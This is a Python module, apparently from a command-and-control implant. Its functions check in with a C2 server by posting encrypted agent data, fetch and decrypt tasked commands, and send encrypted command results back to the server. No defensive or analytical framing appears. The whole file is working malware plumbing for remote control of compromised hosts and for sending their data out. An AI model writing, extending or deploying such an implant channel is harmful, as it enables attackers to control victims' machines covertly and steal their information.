import requests
from . import crypto


def perform_checkin(api_url, agent_data):
    """
    Function of the agent responsible for communicating with the C2 server
    to announce its presence and await instructions.
    """

    try:
        public_agent_id = agent_data.get("agentId")
        encrypted_blob = crypto.encrypt(agent_data)

        payload = {"agentId": public_agent_id, "encrypted_data": encrypted_blob}

        response = requests.post(api_url, json=payload, timeout=10)
        response.raise_for_status()
        response_json = response.json()

        if "task" in response_json and response_json["task"] != "no-task-for-now":
            encrypted_task = response_json["task"]

            decrypted_task_dict = crypto.decrypt(encrypted_task)

            if decrypted_task_dict and "command" in decrypted_task_dict:
                response_json["task"] = decrypted_task_dict["command"]
            else:
                print("[ERROR] Decrypted task has invalid format.")

        return response_json

    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Error in communication with C2: {e}")
        return None


def send_results(results_url, agent_id, task_result):
    """
    Agent function responsible for sending the result of an
    executed command back to the C2 server.
    """
    try:
        internal_data = {"result": task_result}

        encrypted_result = crypto.encrypt(internal_data)

        result_payload = {"agentId": agent_id, "encrypted_data": encrypted_result}

        response = requests.post(results_url, json=result_payload, timeout=10)

        response.raise_for_status()

        print("[INFO] Task result sent to C2.")
        return True

    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Error to send result to C2: {e}")
        return False
